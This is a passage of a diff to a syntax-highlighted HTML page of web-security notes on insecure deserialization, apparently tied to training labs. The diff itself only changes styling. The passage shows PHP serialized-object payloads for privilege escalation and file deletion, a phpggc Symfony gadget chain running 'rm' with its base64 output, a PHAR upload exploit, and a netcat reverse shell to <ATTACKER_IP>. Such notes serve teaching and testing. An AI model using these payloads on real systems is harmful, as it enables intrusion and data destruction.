-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;User&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;username&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;wiener&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;admin&#34;</span>;<span style="color:#a6e22e">b</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>;}
-</span></span></code></pre></div><p>- Then base64 encode and send the serialized object</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;User&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;username&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;wiener&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;admin&#34;</span>;<span style="color:#a6e22e">b</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>;}</span></span></code></pre></div><p>- Then base64 encode and send the serialized object</p>
 <p>- **<code>PHP Type Juggling</code>**</p>
 <p>- Loose comparison operator</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;5j98w3u0n93&#39;</span>  <span style="color:#75715e">//true 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;pa$$w0rd123&#39;</span>  <span style="color:#75715e">//true 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">true</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;passw0rd&#39;</span>  <span style="color:#75715e">//true 
 </span></span></span></code></pre></div><p>- Set any <code>access\_token</code> or password value to integer data type with value <code>0</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;User&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;username&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;wiener&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;access\_token&#34;</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;}
-</span></span></code></pre></div><p>- Setting the binary value true</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;username&#34;</span>;<span style="color:#a6e22e">b</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;password&#34;</span>;<span style="color:#a6e22e">b</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>;}
-</span></span></code></pre></div><p>#### Deleting Arbitrary Files</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;User&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;username&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;wiener&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;access\_token&#34;</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;}</span></span></code></pre></div><p>- Setting the binary value true</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;username&#34;</span>;<span style="color:#a6e22e">b</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;password&#34;</span>;<span style="color:#a6e22e">b</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>;}</span></span></code></pre></div><p>#### Deleting Arbitrary Files</p>
 <p>- Suppose there is a user profile delete functionality, send the POST request that contains a serialized object as</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;User&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;username&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;wiener&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;access\_token&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">32</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;orwtljhce6nd12glundbn07ori09nte7&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;avatar\_link&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">18</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;users/wiener/avatar&#34;</span>;}
-</span></span></code></pre></div><p>- Change the avatar link parameter to any server side file</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;User&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;username&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;wiener&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;access\_token&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">32</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;orwtljhce6nd12glundbn07ori09nte7&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;avatar\_link&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span>;}
-</span></span></code></pre></div><p>#### Arbitrary Object Injection</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;User&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;username&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;wiener&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;access\_token&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">32</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;orwtljhce6nd12glundbn07ori09nte7&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;avatar\_link&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">18</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;users/wiener/avatar&#34;</span>;}</span></span></code></pre></div><p>- Change the avatar link parameter to any server side file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;User&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;username&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;wiener&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;access\_token&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">32</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;orwtljhce6nd12glundbn07ori09nte7&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;avatar\_link&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;/etc/passwd&#34;</span>;}</span></span></code></pre></div><p>#### Arbitrary Object Injection</p>
 <p>- Backup files with **<code>\~</code>**</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>https://example.com/libs/template.php<span style="color:#ae81ff">\~</span>
-</span></span></code></pre></div><p>- Vulnerable Code</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>https://example.com/libs/template.php<span style="color:#ae81ff">\~</span></span></span></code></pre></div><p>- Vulnerable Code</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>&lt;?php
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
@@ -1561,16 +1539,13 @@ X-Auth-Token
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>?&gt;
-</span></span></code></pre></div><p>- Payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>O:14:<span style="color:#e6db74">&#34;CustomTemplate&#34;</span>:1:<span style="color:#f92672">{</span>s:14:<span style="color:#e6db74">&#34;lock\_file\_path&#34;</span>;s:23:<span style="color:#e6db74">&#34;/home/carlos/morale.txt&#34;</span>;<span style="color:#f92672">}</span>
-</span></span></code></pre></div><p>#### phpggc</p>
+</span></span><span style="display:flex;"><span>?&gt;</span></span></code></pre></div><p>- Payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>O:14:<span style="color:#e6db74">&#34;CustomTemplate&#34;</span>:1:<span style="color:#f92672">{</span>s:14:<span style="color:#e6db74">&#34;lock\_file\_path&#34;</span>;s:23:<span style="color:#e6db74">&#34;/home/carlos/morale.txt&#34;</span>;<span style="color:#f92672">}</span></span></span></code></pre></div><p>#### phpggc</p>
 <p><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noreferrer noopener nofollow">https://github.com/ambionics/phpggc</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p>- Listing all available gadget chains</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>./phpggc -l 
-</span></span></code></pre></div><p>- For a gadget chain with RCE attack vector there are three types possible</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>./phpggc -l </span></span></code></pre></div><p>- For a gadget chain with RCE attack vector there are three types possible</p>
 <p>    - RCE (Command)</p>
 <p> </p>
 <p>    ```bash</p>
@@ -1590,14 +1565,12 @@ X-Auth-Token
 <p>    ```</p>
 <p> </p>
 <p>**Example**</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>./phpggc Symfony/RCE4 system <span style="color:#e6db74">&#39;rm /home/carlos/morale.txt&#39;</span> | base64 | tr -d <span style="color:#e6db74">&#39;\\n&#39;</span>
-</span></span></code></pre></div><p>- output</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjY6InN5c3RlbSI7fX0K
-</span></span></code></pre></div><p>#### Phar File Upload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>./phpggc Symfony/RCE4 system <span style="color:#e6db74">&#39;rm /home/carlos/morale.txt&#39;</span> | base64 | tr -d <span style="color:#e6db74">&#39;\\n&#39;</span></span></span></code></pre></div><p>- output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjY6InN5c3RlbSI7fX0K</span></span></code></pre></div><p>#### Phar File Upload</p>
 <p>- Generating exploit.phar file using a php code as</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>&lt;?php
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>include<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;UserSettings.php&#39;</span><span style="color:#f92672">)</span>;
@@ -1626,8 +1599,7 @@ X-Auth-Token
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$phar-&gt;stopBuffering<span style="color:#f92672">()</span>;
-</span></span></code></pre></div><p>- Creates a PHAR archive with a malicious <code>UserSettings</code> object in the metadata.</p>
+</span></span><span style="display:flex;"><span>$phar-&gt;stopBuffering<span style="color:#f92672">()</span>;</span></span></code></pre></div><p>- Creates a PHAR archive with a malicious <code>UserSettings</code> object in the metadata.</p>
 <p>- Executes a Netcat command (nc -nv &lt;ATTACKER_IP&gt; 9999 -e /bin/bash) to establish a reverse shell.</p>
 <p>- Ensuring phar.readonly setting is diabled</p>
 <p>- Upload the phar file as <code>image.jpeg</code></p>
@@ -1638,49 +1610,44 @@ X-Auth-Token
 <p>#### <code>ysoserial</code></p>
 <p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noreferrer noopener nofollow">https://github.com/frohoff/ysoserial</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
 <p>- In Java versions 16 and above, you need to set a series of command-line arguments for Java to run **<code>ysoserial</code>**. For example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>java <span style="color:#960050;background-color:#1e0010">\\</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20<span style="color:#f92672">;</span>  <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com<span style="color:#f92672">.</span><span style="color:#a6e22e">sun</span><span style="color:#f92672">.</span><span style="color:#a6e22e">org</span><span style="color:#f92672">.</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">.</span><span style="color:#a6e22e">xalan</span><span style="color:#f92672">.</span><span style="color:#a6e22e">internal</span><span style="color:#f92672">.</span><span style="color:#a6e22e">xsltc</span><span style="color:#f92672">.</span><span style="color:#a6e22e">trax</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20;  <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">trax</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20<span style="color:#f92672">;</span>  <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com<span style="color:#f92672">.</span><span style="color:#a6e22e">sun</span><span style="color:#f92672">.</span><span style="color:#a6e22e">org</span><span style="color:#f92672">.</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">.</span><span style="color:#a6e22e">xalan</span><span style="color:#f92672">.</span><span style="color:#a6e22e">internal</span><span style="color:#f92672">.</span><span style="color:#a6e22e">xsltc</span><span style="color:#f92672">.</span><span style="color:#a6e22e">runtime</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20;  <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">runtime</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20<span style="color:#f92672">;</span>  <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">net</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20;  <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>java.<span style="color:#a6e22e">net</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
 </span></span><span style="display:flex;"><span>
